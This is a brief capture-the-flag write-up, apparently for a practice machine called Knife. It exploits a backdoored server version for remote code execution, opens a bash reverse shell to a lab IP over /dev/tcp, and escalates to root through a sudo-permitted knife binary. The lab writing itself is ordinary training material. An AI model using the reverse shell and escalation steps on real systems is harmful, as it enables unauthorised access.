# Kinfe

## Nmap scan

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

## Site exploitation

Googling this version of apache we can see someone left a backdoor in it that allows for RCE. This was really fasicinating to read up about and incredibly easy to exploit see bellow on exploit db and wireshark.

{% embed url="https://www.exploit-db.com/exploits/49933" %}

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Now that we know we have code exectution we can run a simple reverse shell like this

```
bash -c 'bash -i >& /dev/tcp/10.10.16.5/9000 0>&1'
```

And we have a shell and the user flag!!

## Priv esc

This was a very simple one. Running sudo -l shows us we can run knife as root we can use [this ](https://gtfobins.github.io/gtfobins/knife/)priv esc to gain a root shell.

And PWNDDDD!!!
